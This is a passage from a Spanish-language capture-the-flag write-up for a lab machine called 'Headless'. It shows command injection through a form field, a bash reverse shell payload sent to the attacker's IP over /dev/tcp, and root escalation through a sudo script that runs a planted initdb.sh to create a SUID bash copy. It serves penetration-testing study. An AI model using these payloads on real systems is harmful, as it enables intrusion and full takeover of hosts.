</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
</span></span><span class=line><span class=cl><span class=n>Referer</span><span class=o>:</span> <span class=l>http://10.10.11.8:5000/dashboard</span>
</span></span><span class=line><span class=cl><span class=n>Cookie</span><span class=o>:</span> <span class=l>is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0</span>
</span></span><span class=line><span class=cl><span class=n>Upgrade-Insecure-Requests</span><span class=o>:</span> <span class=l>1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>date=2023-09-18; id
</span></span></code></pre></div><ul><li>Una vez hecho esto podemos ver que la p√°gina web desplega un mensaje interesante:</li></ul><p><img alt="Headless 6" src=/pentesting/images/Headless_6.png></p><p>Est√° mostrando el output del comando <code>id</code>; de manera que hemos logrado un <code>Command Injection</code> (inyecci√≥n de comandos).</p><ul><li>As√≠, decido inyectar un payload para enviarme una reverse shell a mi equipo de atacante:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>bash -c <span class=s1>&#39;bash -i &gt;&amp; /dev/tcp/10.10.16.3/443 0&gt;&amp;1&#39;</span>
</span></span></code></pre></div><p>donde, nuevamente, <code>10.10.16.3</code> es mi direcci√≥n IP de atacante y <code>443</code> es el puerto en el cual me pondr√© en escucha con <code>netcat</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ nc -lvnp 443
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>listening on [any] 443 ...
</span></span></span></code></pre></div><ul><li>Ahora enviamos el payload para la reverse shell utilizando <code>Burpsuite</code>, de manera que la petici√≥n por <code>POST</code> ahora se ve como:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/dashboard</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>10.10.11.8:5000</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>en-US,en;q=0.5</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate, br</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/x-www-form-urlencoded</span>
</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>19</span>
</span></span><span class=line><span class=cl><span class=n>Origin</span><span class=o>:</span> <span class=l>http://10.10.11.8:5000</span>
</span></span><span class=line><span class=cl><span class=n>DNT</span><span class=o>:</span> <span class=l>1</span>
</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
</span></span><span class=line><span class=cl><span class=n>Referer</span><span class=o>:</span> <span class=l>http://10.10.11.8:5000/dashboard</span>
</span></span><span class=line><span class=cl><span class=n>Cookie</span><span class=o>:</span> <span class=l>is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0</span>
</span></span><span class=line><span class=cl><span class=n>Upgrade-Insecure-Requests</span><span class=o>:</span> <span class=l>1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>date=2023-09-18%3b+bash+-c+&#39;bash+-i+&gt;%26+/dev/tcp/10.10.16.3/443+0&gt;%261&#39;
</span></span></code></pre></div><ul><li>Una vez enviada la petici√≥n obtenemos una conexi√≥n como el usuario <code>dvir</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ nc -lvnp 443
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>listening on [any] 443 ...
</span></span></span><span class=line><span class=cl><span class=go>connect to [10.10.16.3] from (UNKNOWN) [10.10.11.8] 36576
</span></span></span><span class=line><span class=cl><span class=go>bash: cannot set terminal process group (1353): Inappropriate ioctl for device
</span></span></span><span class=line><span class=cl><span class=go>bash: no job control in this shell
</span></span></span><span class=line><span class=cl><span class=go>dvir@headless:~/app$ whoami
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>whoami
</span></span></span><span class=line><span class=cl><span class=go>dvir
</span></span></span></code></pre></div><p>donde podemos tener la flag de <code>user</code> en el directorio <code>/home/dvir</code>.</p><hr><h2 id=root>Root
<a class=heading-link href=#root><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><ul><li>Podemos ver que este usuario puede correr un script con <code>sudo</code> sin necesidad de proveer una contrase√±a:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>dvir@headless:~/app$ sudo -l
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Matching Defaults entries for dvir on headless:
</span></span></span><span class=line><span class=cl><span class=go>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>User dvir may run the following commands on headless:
</span></span></span><span class=line><span class=cl><span class=go>    (ALL) NOPASSWD: /usr/bin/syscheck
</span></span></span></code></pre></div><ul><li>Noto que √©ste no es m√°s que un script en <code>Bash</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>dvir@headless:~/app$ file /usr/bin/syscheck
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>/usr/bin/syscheck: Bourne-Again shell script, ASCII text executable
</span></span></span></code></pre></div><p>No obstante, no podemos escribir sobre/modificar √©ste:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>dvir@headless:~/app$ ls -la /usr/bin/syscheck
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>-r-xr-xr-x 1 root root 768 Feb  2 16:11 /usr/bin/syscheck
</span></span></span></code></pre></div><ul><li>Leyendo el script con <code>cat /usr/bin/syscheck</code> tenemos:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=cp>#!/bin/bash
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=o>[</span> <span class=s2>&#34;</span><span class=nv>$EUID</span><span class=s2>&#34;</span> -ne <span class=m>0</span> <span class=o>]</span><span class=p>;</span> <span class=k>then</span>
</span></span><span class=line><span class=cl>  <span class=nb>exit</span> <span class=m>1</span>
</span></span><span class=line><span class=cl><span class=k>fi</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>last_modified_time</span><span class=o>=</span><span class=k>$(</span>/usr/bin/find /boot -name <span class=s1>&#39;vmlinuz*&#39;</span> -exec stat -c %Y <span class=o>{}</span> + <span class=p>|</span> /usr/bin/sort -n <span class=p>|</span> /usr/bin/tail -n 1<span class=k>)</span>
</span></span><span class=line><span class=cl><span class=nv>formatted_time</span><span class=o>=</span><span class=k>$(</span>/usr/bin/date -d <span class=s2>&#34;@</span><span class=nv>$last_modified_time</span><span class=s2>&#34;</span> +<span class=s2>&#34;%d/%m/%Y %H:%M&#34;</span><span class=k>)</span>
</span></span><span class=line><span class=cl>/usr/bin/echo <span class=s2>&#34;Last Kernel Modification Time: </span><span class=nv>$formatted_time</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>disk_space</span><span class=o>=</span><span class=k>$(</span>/usr/bin/df -h / <span class=p>|</span> /usr/bin/awk <span class=s1>&#39;NR==2 {print $4}&#39;</span><span class=k>)</span>
</span></span><span class=line><span class=cl>/usr/bin/echo <span class=s2>&#34;Available disk space: </span><span class=nv>$disk_space</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>load_average</span><span class=o>=</span><span class=k>$(</span>/usr/bin/uptime <span class=p>|</span> /usr/bin/awk -F<span class=s1>&#39;load average:&#39;</span> <span class=s1>&#39;{print $2}&#39;</span><span class=k>)</span>
</span></span><span class=line><span class=cl>/usr/bin/echo <span class=s2>&#34;System load average: </span><span class=nv>$load_average</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> ! /usr/bin/pgrep -x <span class=s2>&#34;initdb.sh&#34;</span> <span class=p>&amp;</span>&gt;/dev/null<span class=p>;</span> <span class=k>then</span>
</span></span><span class=line><span class=cl>  /usr/bin/echo <span class=s2>&#34;Database service is not running. Starting it...&#34;</span>
</span></span><span class=line><span class=cl>  ./initdb.sh 2&gt;/dev/null
</span></span><span class=line><span class=cl><span class=k>else</span>
</span></span><span class=line><span class=cl>  /usr/bin/echo <span class=s2>&#34;Database service is running.&#34;</span>
</span></span><span class=line><span class=cl><span class=k>fi</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>exit</span> <span class=m>0</span>
</span></span></code></pre></div><ul><li>Noto que este script busca otro script llamado <code>initdb.sh</code> en el <em>directorio actual de trabajo</em> y, adem√°s, <em>lo est√° ejecutando</em>. De manera que corro los siguientes comandos:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>dvir@headless:~/app$ echo -e &#39;#!/bin/bash\ncp $(which bash) /tmp/gunzf0x; chmod 4755 /tmp/gunzf0x&#39; &gt; ./initdb.sh
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>dvir@headless:~/app$ chmod +x ./initdb.sh
</span></span></span></code></pre></div><p>B√°sicamente, el primer comando que hemos corrido est√° creando un script en <code>Bash</code> con el contenido:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=cp>#!/bin/bash
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl>cp <span class=k>$(</span>which bash<span class=k>)</span> /tmp/gunzf0x<span class=p>;</span> chmod <span class=m>4755</span> /tmp/gunzf0x
</span></span></code></pre></div><p>el cual est√° creando una copia del binaro <code>/bin/bash</code> y, a esa copia, le asigna permisos <code>SUID</code>. De manera que podemos correr el binario copiado con permisos del due√±o (el cual en este caso ser√° el usuario <code>root</code>).</p><p>El segundo comando (<code>chmod +x ./initdb.sh</code>) es usado para asignar permisos de ejecuci√≥n al script creado y as√≠ evitar posibles problemas.</p><ul><li>Luego, simplemente ejecuto:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>dvir@headless:~/app$ sudo /usr/bin/syscheck
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Last Kernel Modification Time: 01/02/2024 10:05
</span></span></span><span class=line><span class=cl><span class=go>Available disk space: 1.7G
</span></span></span><span class=line><span class=cl><span class=go>System load average:  0.01, 0.03, 0.13
</span></span></span><span class=line><span class=cl><span class=go>Database service is not running. Starting it...
</span></span></span></code></pre></div><ul><li>Reviso que, efectivamente, mi archivo malicioso ha sido creado:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>dvir@headless:~/app$ ls -la /tmp
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>total 1288
</span></span></span><span class=line><span class=cl><span class=go>drwxrwxrwt 13 root root    4096 May 26 05:32 .
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x 18 root root    4096 Feb 16 23:49 ..
</span></span></span><span class=line><span class=cl><span class=go>drwxrwxrwt  2 root root    4096 May 25 21:31 .font-unix
</span></span></span><span class=line><span class=cl><span class=go>-rwsr-xr-x  1 root root 1265648 May 26 05:32 gunzf0x
</span></span></span><span class=line><span class=cl><span class=go>drwxrwxrwt  2 root root    4096 May 25 21:31 .ICE-unix
</span></span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span></code></pre></div><p>y, finalmente, podemos ejecutar este archivo malicioso junto con la flag <code>-p</code> para ejecutarla como el due√±o de √©ste (el cual ser√° <code>root</code>):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>dvir@headless:~/app$ /tmp/gunzf0x -p
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>gunzf0x-5.2# whoami
</span></span></span><span class=line><span class=cl><span class=go>root
</span></span></span></code></pre></div><p>Podemos obtener la flag del usuario <code>root</code> en el directorio <code>/root</code>. M√°quina completada.</p><p>~Happy Hacking</p></div><footer></footer></article></section></div><footer class=footer><section class=container>¬©
2023 -
2024
gunzf0x
¬∑
Desarrollado por <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> & <a href=https://github.com/luizdepra/hugo-coder/ target=_blank rel=noopener>Coder</a>.</section></footer></main><script src=/pentesting/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script></body></html>